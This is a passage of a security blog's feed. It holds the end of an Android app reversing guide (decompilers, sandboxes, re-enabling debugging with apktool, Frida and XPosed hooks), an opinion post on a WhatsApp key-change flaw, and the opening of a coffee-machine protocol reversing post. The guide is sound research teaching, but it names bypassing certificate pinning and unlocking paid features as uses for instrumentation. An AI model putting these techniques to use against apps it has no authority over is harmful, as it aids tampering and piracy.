<h5 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h5><p>The very first disassembler and decompiler that every decent reverser should know about is <a href="https://www.hex-rays.com/products/decompiler/" target="_blank" rel="noopener">Hex-Rays IDA</a> which is the state of the art reversing tool for native code. Along with an IDA license, you can also buy a <code>decompiler</code> license, in which case IDA will also be able to rebuild pseudo C-like code from the assembly, allowing you to read an higher level representation of the library logic.</p>
<p><img src="/images/2017/04/ida.gif" alt="IDA"></p>
<p>Unfortunately IDA is a very expensive software and, unless you’re reversing native stuff professionaly, it’s really not worth spending all those money for a single tool … <small>warez</small> … ehm … :P</p>
<h5 id="Hopper"><a href="#Hopper" class="headerlink" title="Hopper"></a>Hopper</h5><p>If you’re on a budget but you need to reverse native code, instead of IDA you can give <a href="https://www.hopperapp.com/" target="_blank" rel="noopener">Hopper</a> a try. It’s definitely not as good and complete as IDA, but it’s much cheaper and will be good enough for most of the cases.</p>
<p>Hopper supports GNU/Linux and macOS ( no Windows! ) and, just like IDA, has a builtin decompiler which is quite decent considering its price:</p>
<p><img src="/images/2017/04/hopper.jpg" alt="Hopper"></p>
<h3 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h3><p>When static analysis is not enough, maybe because the application is <a href="https://www.evilsocket.net/2016/04/18/how-i-defeated-an-obfuscated-and-anti-tamper-apk-with-some-python-and-a-home-made-smali-emulator/">obfuscated</a> or the codebase is simply too big and complex to quickly isolate the routines you’re interested into, you need to go dynamic.</p>
<p>Dynamic analysis simply means that you’ll execute the app ( like we did while performing network analysis ) and somehow trace into its execution using different tools, strategies and methods.</p>
<h4 id="Sandboxing"><a href="#Sandboxing" class="headerlink" title="Sandboxing"></a>Sandboxing</h4><p>Sandboxing is a black-box dynamic analysis strategy, which means you’re not going to actively trace <strong>into</strong> the application code ( like you do while debugging ), but you’ll execute the app into some container that will log the most relevant actions for you and will present a report at the end of the execution.</p>
<h5 id="Cuckoo-Droid"><a href="#Cuckoo-Droid" class="headerlink" title="Cuckoo-Droid"></a>Cuckoo-Droid</h5><p><a href="https://github.com/idanr1986/cuckoo-droid" target="_blank" rel="noopener">Cuckoo-Droid</a> is an Android port of the famous Cuckoo sandbox, once installed and configured, it’ll give you an activity report with all the URLs the app contacted, all the DNS queries, API calls and so forth:</p>
<p><img src="/images/2017/04/cuckoo.png" alt="Cuckoo"></p>
<h5 id="Joe-Sandbox"><a href="#Joe-Sandbox" class="headerlink" title="Joe Sandbox"></a>Joe Sandbox</h5><p>The mobile <a href="https://www.joesecurity.org/joe-sandbox-mobile" target="_blank" rel="noopener">Joe Sandbox</a> is a great online service that allows you to upload an APK and get its activity report without the hassle of installing or configuring anything.</p>
<p>This is a <a href="https://www.joesecurity.org/reports/report-14d9f1a92dd984d6040cc41ed06e273e.html" target="_blank" rel="noopener">sample report</a>, as you can see the kind of information is pretty much the same as Cuckoo-Droid, plus there’re a bunch of heuristics being executed in order to behaviourally correlate the sample to other known applications.</p>
<p><img src="/images/2017/04/joe.jpg" alt="Joe Sandbox"></p>
<h4 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h4><p>If sandboxing is not enough and you need to get deeper insights of the application behaviour, you’ll need to debug it. Debugging an app, in case you don’t know, means attaching to the running process with a <code>debugger</code> software, putting <code>breakpoints</code> that will allow you to stop the execution and inspect the memory state and <code>step</code> into code lines one by one in order to follow the execution graph very closely.</p>
<h5 id="Enabling-Debug-Mode"><a href="#Enabling-Debug-Mode" class="headerlink" title="Enabling Debug Mode"></a>Enabling Debug Mode</h5><p>When an application is compiled and eventually published to the Google Play Store, it’s usually its <code>release</code> build you’re looking at, meaning debugging has been disabled by the developer and you can’t attach to it directly. In order to enable debugging again, we’ll need to use <code>apktool</code> to decompile the app:</p>
<pre><code>apktool d application.apk
</code></pre><p>Then you’ll need to edit the <code>AndroidManifest.xml</code> generated file, adding the <code>android:debuggable=&quot;true&quot;</code> attribute to its <code>application</code> XML node:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span> <span class="attr">package</span>=<span class="string">"com.company.appname"</span> </span></span><br><span class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionCode</span>=<span class="string">"24"</span> </span></span><br><span class="line"><span class="tag">                                                                     <span class="attr">platformBuildVersionName</span>=<span class="string">"7.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span> <span class="attr">android:icon</span>=<span class="string">"@mipmap/ic_launcher"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">"@string/app_name"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">"true"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">"@style/AppTheme"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:debuggable</span>=<span class="string">"true"</span>&gt;</span> <span class="tag">&lt;<span class="name">--</span> !!! <span class="attr">NOTICE</span> <span class="attr">ME</span> !!! <span class="attr">--</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">"com.company.appname.MainActivity"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Once you updated the manifest, let’s rebuild the app:</p>
<pre><code>apktool b -d application_path output.apk
</code></pre><p>Now let’s resign it:</p>
<pre><code>git clone https://github.com/appium/sign
java -jar sign/dist/signapk.jar sign/testkey.x509.pem sign/testkey.pk8 output.apk signed.apk
</code></pre><p>And reinstall it on the device (make sure you unistalled the original version first):</p>
<pre><code>adb install signed.apk
</code></pre><p>Now you can proceed debugging the app ^_^</p>
<h5 id="Android-Studio"><a href="#Android-Studio" class="headerlink" title="Android Studio"></a>Android Studio</h5><p><a href="https://developer.android.com/studio/debug/index.html" target="_blank" rel="noopener">Android Studio</a> is the official Android IDE, once you have debug mode enabled for your app, you can directly attach to it using this IDE and start debugging:</p>
<p><img src="/images/2017/04/androidstudio.png" alt="Android Studio Debugger"></p>
<h5 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h5><p>If you have an IDA license that supports Dalvik debugging, you can attach to a running process and step trough the smali code, <a href="https://www.hex-rays.com/products/ida/support/tutorials/debugging_dalvik.pdf" target="_blank" rel="noopener">this document</a> describes how to do it, but basically the idea is that you upload the ARM debugging server ( a native ARM binary ) on your device, you start it using <code>adb</code> and eventually you start your debugging session from IDA.</p>
<p><img src="/images/2017/04/idadbg.gif" alt="IDA Dalvik Debugger"></p>
<h4 id="Dynamic-Instrumentation"><a href="#Dynamic-Instrumentation" class="headerlink" title="Dynamic Instrumentation"></a>Dynamic Instrumentation</h4><p>Dynamic instrumentation means that you want to modify the application behaviour at runtime and in order to do so you inject some “agent” into the app that you’ll eventually use to instrument it.</p>
<p>You might want to do this in order to make the app bypass some checks ( for instance, if public key pinning is enforced, you might want to disable it with dynamic instrumentation in order to easily inspect the HTTPS traffic ), make it show you information it’s not supposed to show ( unlock “Pro” features, or debug/admin activities ), etc.</p>
<h5 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h5><p><a href="https://www.frida.re/" target="_blank" rel="noopener">Frida</a> is a great and free tool you can use to inject a whole Javascript engine into a running process on Android, iOS and many other platforms … but why Javascript?</p>
<p>Because once the engine is injected, you can instrument the app in very cool and easy ways like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># let's attach to the 'hello process</span></span><br><span class="line">session = frida.attach(<span class="string">"hello"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now let's create the Javascript we want to inject</span></span><br><span class="line">script = session.create_script(<span class="string">"""</span></span><br><span class="line"><span class="string">Interceptor.attach(ptr("%s"), &#123;</span></span><br><span class="line"><span class="string">    onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">        send(args[0].toInt32());</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span> % int(sys.argv[<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># this function will receive events from the js</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># let's start!</span></span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>
<p>In this example, we’re just inspecting some function argument, but there’re hundreds of things you can do with Frida, just <a href="https://www.frida.re/docs/home/" target="_blank" rel="noopener">RTFM!</a> and use your imagination :D</p>
<p><a href="https://github.com/dweinstein/awesome-frida" target="_blank" rel="noopener">Here</a>‘s a list of cool Frida resources, enjoy!</p>
<h5 id="XPosed"><a href="#XPosed" class="headerlink" title="XPosed"></a>XPosed</h5><p>Another option we have for instrumenting our app is using the <a href="http://repo.xposed.info/" target="_blank" rel="noopener">XPosed Framework</a>. XPosed is basically an instrumentation layer for the whole Dalvik VM which <a href="http://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">requires</a> you to to have a rooted phone in order to install it.</p>
<p>From XPosed <a href="https://github.com/rovo89/XposedBridge/wiki/Development-tutorial" target="_blank" rel="noopener">wiki</a>:</p>
<pre><code>There is a process that is called &quot;Zygote&quot;. This is the heart of the Android runtime. Every application is started as a copy (&quot;fork&quot;) of it. This process is started by an /init.rc script when the phone is booted. The process start is done with /system/bin/app_process, which loads the needed classes and invokes the initialization methods.

This is where Xposed comes into play. When you install the framework, an extended app_process executable is copied to /system/bin. This extended startup process adds an additional jar to the classpath and calls methods from there at certain places. For instance, just after the VM has been created, even before the main method of Zygote has been called. And inside that method, we are part of Zygote and can act in its context.

The jar is located at /data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar and its source code can be found here. Looking at the class XposedBridge, you can see the main method. This is what I wrote about above, this gets called in the very beginning of the process. Some initializations are done there and also the modules are loaded (I will come back to module loading later).
</code></pre><p>Once you’ve installed XPosed on your smartphone, you can start developing your own module (again, follow the <a href="https://github.com/rovo89/XposedBridge/wiki/Development-tutorial" target="_blank" rel="noopener">project wiki</a>), for instance, here’s an example of how you would hook the <code>updateClock</code> method of the SystemUI application in order to instrument it:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> de.robv.android.xposed.mods.tutorial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tutorial</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(<span class="keyword">final</span> LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!lpparam.packageName.equals(<span class="string">"com.android.systemui"</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(<span class="string">"com.android.systemui.statusbar.policy.Clock"</span>, lpparam.classLoader, <span class="string">"updateClock"</span>, </span><br><span class="line">            <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">// this will be called before the clock was updated by the original method</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">// this will be called after the clock was updated by the original method</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>There’re already a lot of <a href="http://repo.xposed.info/module-overview" target="_blank" rel="noopener">user contributed modules</a> you can use, study and modify for your own needs.</p>
<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>I hope you’ll find this reference guide useful for your Android reversing adventures, keep in mind that the most important thing while reversing is not the tool you’re using, but how you use it, so you’ll have to learn how to choose the appropriate tool for your scenario and this is something you can only learn with experience, so enough reading and start reversing! :D</p>
<div style="position:relative;height:0;padding-bottom:56.25%"><iframe src="https://www.youtube.com/embed/I1188GO4p1E?ecver=2" width="640" height="360" frameborder="0" style="position:absolute;width:100%;height:100%;left:0" allowfullscreen></iframe></div>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Every day we see a bunch of new Android applications being published on the Google Play Store, from games, to utilities, to IoT devices clients and so forth, almost every single aspect of our life can be somehow controlled with “an app”. We have smart houses, &lt;a href=&quot;https://www.evilsocket.net/2015/01/29/nike-fuelband-se-ble-protocol-reversed/&quot;&gt;smart fitness devices&lt;/a&gt; and &lt;a href=&quot;https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/&quot;&gt;smart coffee machines&lt;/a&gt; … but is this stuff just smart or is it &lt;strong&gt;secure&lt;/strong&gt; as well? :)&lt;/p&gt;
&lt;p&gt;Reversing an Android application can be a (relatively) easy and fun way to answer this question, that’s why I decided to write this blog post where I’ll try to explain the basics and give you some of my “tricks” to reverse this stuff faster and more effectively.&lt;/p&gt;
&lt;p&gt;I’m not going to go very deep into technical details, you can learn yourself how Android works, how the Dalvik VM works and so forth, this is gonna be a &lt;strong&gt;very basic practical guide&lt;/strong&gt; instead of a post full of theoretical stuff but no really useful contents.&lt;/p&gt;
&lt;p&gt;Let’s start! :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/04/head.jpeg&quot; alt=&quot;start&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="android" scheme="https://www.evilsocket.net/tags/android/"/>
    
      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
    
      <category term="apk" scheme="https://www.evilsocket.net/tags/apk/"/>
    
      <category term="dalvik" scheme="https://www.evilsocket.net/tags/dalvik/"/>
    
      <category term="dex" scheme="https://www.evilsocket.net/tags/dex/"/>
    
      <category term="re" scheme="https://www.evilsocket.net/tags/re/"/>
    
      <category term="IDA" scheme="https://www.evilsocket.net/tags/IDA/"/>
    
      <category term="Hopper" scheme="https://www.evilsocket.net/tags/Hopper/"/>
    
      <category term="JADX" scheme="https://www.evilsocket.net/tags/JADX/"/>
    
      <category term="apktool" scheme="https://www.evilsocket.net/tags/apktool/"/>
    
      <category term="JD-GUI" scheme="https://www.evilsocket.net/tags/JD-GUI/"/>
    
      <category term="Dex2Jar" scheme="https://www.evilsocket.net/tags/Dex2Jar/"/>
    
      <category term="Frida" scheme="https://www.evilsocket.net/tags/Frida/"/>
    
      <category term="XPosed" scheme="https://www.evilsocket.net/tags/XPosed/"/>
    
      <category term="XPosed Framework" scheme="https://www.evilsocket.net/tags/XPosed-Framework/"/>
    
  </entry>
  
  <entry>
    <title>Thoughts on WhatsApp E2E Encryption AKA Security Is Real Only if It&#39;s the Default.</title>
    <link href="https://www.evilsocket.net/2017/01/14/Thoughts-on-WhatsApp-E2E-Encryption-AKA-Security-is-real-only-if-it-s-the-default/"/>
    <id>https://www.evilsocket.net/2017/01/14/Thoughts-on-WhatsApp-E2E-Encryption-AKA-Security-is-real-only-if-it-s-the-default/</id>
    <published>2017-01-14T19:10:02.000Z</published>
    <updated>2019-10-19T08:14:27.112Z</updated>
    
    <content type="html"><![CDATA[<p>Yesterday <a href="https://twitter.com/tobiasboelter" target="_blank" rel="noopener">Tobias Boelter</a> posted on his blog <a href="https://tobi.rocks/2017/01/whatsapp-vulnerability-bug-or-backdoor/" target="_blank" rel="noopener">this article</a> which essentially highlights a message rentransmission vulnerability on WhatsApp which makes it leak sensitive information if the recipient’s key changed, only alerting the user <strong>after</strong> the message has been sent.<br>The Guardian has then picked up the info and posted the article “<a href="https://www.theguardian.com/technology/2017/jan/13/whatsapp-backdoor-allows-snooping-on-encrypted-messages" target="_blank" rel="noopener">WhatsApp vulnerability allows snooping on encrypted messages</a>“. </p>
<p>In a matter of hours, a shit load of experts (and unfortunately also lot of ppl who are <strong>not</strong> experts at all) pointed their fingers at The Guardian, arguing that it’s not a backdoor and all other kind of sterile polemics. At some point, Moxie from Open Whisper Systems, the noprofit organization who made <strong>Signal</strong>, the only really secure messaging app we’re aware of <strong>and</strong> the library that WhatsApp recently integrated in order to give E2E encrypted messaging to all of their users, published on the blog this: “<a href="https://whispersystems.org/blog/there-is-no-whatsapp-backdoor/" target="_blank" rel="noopener">There is no WhatsApp ‘backdoor’</a>“, which <strong>seemed</strong> to have put the word END to this conversation.</p>
<p>I do not agree and, since a lot of <strong>ego</strong> is going on here, I’d like to share my thoughts as well.</p>
<a id="more"></a>
<center><br><blockquote class="twitter-tweet" data-lang="it"><p lang="en" dir="ltr">.<a href="https://twitter.com/guardian" target="_blank" rel="noopener">@guardian</a> Pathetically, everyone who jumped to trumpet my tweets of a Telegram weakness will ignore this because WhatsApp staff stroked the right egos</p>&mdash; Nadim Kobeissi (@kaepora) <a href="https://twitter.com/kaepora/status/819893937934434304" target="_blank" rel="noopener">13 gennaio 2017</a></blockquote><br><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>First thing first, following the <strong>PoC||GTFO</strong> sacrosanct principle, let’s take a look at the video that Tobias recently uploaded.</p>
<center><br>    <iframe width="100%" height="315" src="https://www.youtube.com/embed/we-pJE5JjAs" frameborder="0" allowfullscreen></iframe><br></center>

<p>In the video Tobias just swapped the SIM card to the other phone to prove his point, but it’s quite clear that from a state sponsored attacker perspective, physical access to the sim card or the victim’s phone is not needed at all, there are plenty of easier ways for them to do that ( pretty much like <a href="https://lists.cpunks.org/pipermail/cypherpunks/2016-April/012958.html" target="_blank" rel="noopener">Russia did with SS7 &amp; Telegram users</a> ).</p>
<p>Long story short, if WhatsApp technicians manage to replace your recipient E2E encryption key on the server side and impersonate him (or manage to clone his sim on the TELCO side), <strong>your sensitive message will be sent anyway</strong>, the client will show you just a warning about the key change, but nevertheless, let’s say it again, <strong>your sensitive message will be sent anyway</strong> … and they’ll be able to read it, <strong>period</strong>.</p>
<center><br>    <img width="250" src="https://whispersystems.org/blog/images/whatsapp-keychange.png"><br></center>

<p>On the other hand, <a href="https://play.google.com/store/apps/details?id=org.thoughtcrime.securesms" target="_blank" rel="noopener">Signal</a> prevents this from happening, once it’ll detect the key being changed, it will <strong>block</strong> the conversation and warn the user about it, it’ll be the user then to decide if trusting the new key or not, regardless, <strong>the sensitive contents won’t be rentransmitted without the user allowing it</strong>, this is a subtle but very important detail.</p>
<h3 id="But-it’s-just-a-matter-of-settings"><a href="#But-it’s-just-a-matter-of-settings" class="headerlink" title="But it’s just a matter of settings!"></a>But it’s just a matter of settings!</h3><center><br><blockquote class="twitter-tweet" data-lang="it"><p lang="en" dir="ltr">quoting mr <a href="https://twitter.com/csoghoian" target="_blank" rel="noopener">@csoghoian</a>, this sentence quite fits in this whole WhatsApp / Guardian / <a href="https://twitter.com/whispersystems" target="_blank" rel="noopener">@whispersystems</a> discussion <a href="https://t.co/DHEnmYqRrw" target="_blank" rel="noopener">pic.twitter.com/DHEnmYqRrw</a></p>&mdash; Simone Margaritelli (@evilsocket) <a href="https://twitter.com/evilsocket/status/820100621898547201" target="_blank" rel="noopener">14 gennaio 2017</a></blockquote><br><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>Yes, they <strong>do</strong> implement the same protocol and <strong>no</strong>, we don’t have any real evidence that Facebook messed with it, <strong>still</strong> they created (either intentionally or not) a very serious security vulnerability for their users.</p>
<p>And it’s exactly about <strong>intentionality</strong> we’re talking about, if it was intentionally implelemented to spy on users <strong>it’s a backdoor</strong>, otherwise <strong>it’s not a backdoor</strong> … but <strong>we don’t know</strong>, we never will and honestly it’s just a stupid and pointless waste of time discussing about it further.</p>
<h3 id="Usability-Really"><a href="#Usability-Really" class="headerlink" title="Usability? Really?"></a>Usability? Really?</h3><p>But the point is, <strong>why implementing e2e encryption in the first place if when keys do not match what expected, the client transmits the message anyway?</strong> Usability? <strong>The usability of what</strong>? Because E2E encryption is <strong>not</strong> usable that way, the client itself might be, but definitely not the underlying protocol which should guarantee the users privacy <strong>on top of everything else</strong>.</p>
<p>Moreover, do you really expect the average whatsapp user to understand what that yellow baloon means if you don’t clearly block the conversation and warn him about what happened? Is this usability? COME ON!</p>
<p>I think Moxie just missed the point, which is <strong>not</strong> they key being changed, but the client retransmitting the message regardless!<br>I used to respect him for his life-long battle for privacy, but reading his post it’s quite clear how his opinion is biased towards Facebook.</p>
<center><br><blockquote class="twitter-tweet" data-conversation="none" data-lang="it"><p lang="en" dir="ltr">.<a href="https://twitter.com/guardian" target="_blank" rel="noopener">@guardian</a> Whisper Systems comes to Facebook/WhatsApp&#39;s defense on its own blog honestly not understanding the problem. Wow. <a href="https://t.co/6EZ0K9Xcle" target="_blank" rel="noopener">https://t.co/6EZ0K9Xcle</a></p>&mdash; Nadim Kobeissi (@kaepora) <a href="https://twitter.com/kaepora/status/820028708803088385" target="_blank" rel="noopener">13 gennaio 2017</a></blockquote><br><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>I’m not a cryptographer of a crypto expert of any kind, but I’ve spent quite a few years working on MITM attacks and tools, I’m well aware how easy it is for <strong>anyone</strong> to exploit the information you leak on a network, and I’m well aware that state sponsored attackers have trillions of other ways to do that more easily and transparently (for the user of course) … we should just stop the drama about it being a backdoor or not and focus on what really matters:</p>
<p><strong>It is definitely a serious security issue for the users privacy and Facebook refused to fix it</strong>.</p>
<p>There’s really nothing more than that to say.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yesterday &lt;a href=&quot;https://twitter.com/tobiasboelter&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Tobias Boelter&lt;/a&gt; posted on his blog &lt;a href=&quot;https://tobi.rocks/2017/01/whatsapp-vulnerability-bug-or-backdoor/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;this article&lt;/a&gt; which essentially highlights a message rentransmission vulnerability on WhatsApp which makes it leak sensitive information if the recipient’s key changed, only alerting the user &lt;strong&gt;after&lt;/strong&gt; the message has been sent.&lt;br&gt;The Guardian has then picked up the info and posted the article “&lt;a href=&quot;https://www.theguardian.com/technology/2017/jan/13/whatsapp-backdoor-allows-snooping-on-encrypted-messages&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;WhatsApp vulnerability allows snooping on encrypted messages&lt;/a&gt;“. &lt;/p&gt;
&lt;p&gt;In a matter of hours, a shit load of experts (and unfortunately also lot of ppl who are &lt;strong&gt;not&lt;/strong&gt; experts at all) pointed their fingers at The Guardian, arguing that it’s not a backdoor and all other kind of sterile polemics. At some point, Moxie from Open Whisper Systems, the noprofit organization who made &lt;strong&gt;Signal&lt;/strong&gt;, the only really secure messaging app we’re aware of &lt;strong&gt;and&lt;/strong&gt; the library that WhatsApp recently integrated in order to give E2E encrypted messaging to all of their users, published on the blog this: “&lt;a href=&quot;https://whispersystems.org/blog/there-is-no-whatsapp-backdoor/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;There is no WhatsApp ‘backdoor’&lt;/a&gt;“, which &lt;strong&gt;seemed&lt;/strong&gt; to have put the word END to this conversation.&lt;/p&gt;
&lt;p&gt;I do not agree and, since a lot of &lt;strong&gt;ego&lt;/strong&gt; is going on here, I’d like to share my thoughts as well.&lt;/p&gt;
    
    </summary>
    
    
      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
    
      <category term="whatsapp" scheme="https://www.evilsocket.net/tags/whatsapp/"/>
    
      <category term="end to end encryption" scheme="https://www.evilsocket.net/tags/end-to-end-encryption/"/>
    
      <category term="the guardian" scheme="https://www.evilsocket.net/tags/the-guardian/"/>
    
      <category term="backdoor" scheme="https://www.evilsocket.net/tags/backdoor/"/>
    
  </entry>
  
  <entry>
    <title>Reversing the Smarter Coffee IoT Machine Protocol to Make Coffee Using the Terminal.</title>
    <link href="https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/"/>
    <id>https://www.evilsocket.net/2016/10/09/IoCOFFEE-Reversing-the-Smarter-Coffee-IoT-machine-protocol-to-make-coffee-using-terminal/</id>
    <published>2016-10-09T13:09:11.000Z</published>
    <updated>2019-10-19T08:14:27.108Z</updated>
    
    <content type="html"><![CDATA[<p>I love coffee, that’s a fact, and I drink liters of it during the week … I also am a nerd and a hacker, so a few days ago I bought a <a href="http://smarter.am/coffee/" target="_blank" rel="noopener">Smarter Coffee</a> machine on Amazon, basically a coffee machine that you can control over your home wifi network using a mobile application ( both for Android and iOS ).<br>The app is really nice: you can set the amount of cups you want, the strength of the coffee, etc, then you only need to press a button and wait for your delicious coffee to be brewed.</p>
<p>Since I work from home, most of the times I’m using the computer keyboard, not a smartphone, therefore I wanted/needed a console client for it, something that the vendor never released, so I started reversing the Android application in order to understand the communication protocol and write my own client implementation … guess what? :D</p>
<p>Yep, i can make coffee using the terminal now :D</p>
<center><br><img src="/images/2016/10/terminal.png" alt="terminal"><br></center>

<a id="more"></a>
